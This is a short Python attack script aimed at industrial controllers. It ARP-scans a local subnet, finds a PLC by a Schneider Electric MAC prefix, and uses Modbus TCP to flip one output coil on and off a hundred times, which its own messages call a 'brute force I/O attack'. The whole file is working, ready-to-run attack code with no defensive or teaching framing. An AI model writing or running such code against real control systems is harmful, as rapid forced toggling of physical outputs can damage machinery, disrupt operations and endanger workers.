from pymodbus.client import ModbusTcpClient
from scapy.all import ARP, Ether, srp
import time

def find_plc_ip():
    # Define the IP range to scan (adjust as needed)
    ip_range = "192.168.1.0/24"
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send the packet and get the response
    result = srp(packet, timeout=2, verbose=0)[0]

    # Extract the IP addresses from the response
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    # Assuming the PLC has a specific MAC prefix (e.g., Schneider Electric)
    plc_mac_prefix = "00:80:41"  # Adjust based on your PLC's MAC address
    plc_ip = None
    for device in devices:
        if device['mac'].startswith(plc_mac_prefix):
            plc_ip = device['ip']
            break

    if plc_ip:
        print(f"Found PLC at IP: {plc_ip}")
        return plc_ip
    else:
        print("PLC not found in the network.")
        return None

def brute_force_io(plc_ip, io_address, iterations=100, delay=0.1):
    # Connect to the PLC
    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print("Failed to connect to the PLC.")
        return

    print(f"Brute forcing I/O at address {io_address}...")
    for i in range(iterations):
        # Alternate between 0 and 1 to simulate brute force
        value = i % 2
        client.write_coil(io_address, value)
        print(f"Set I/O {io_address} to {value}")
        time.sleep(delay)

    client.close()
    print("Brute force I/O attack completed.")

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        # Specify the I/O address to brute force (adjust as needed)
        io_address = 0x0000
        brute_force_io(plc_ip, io_address)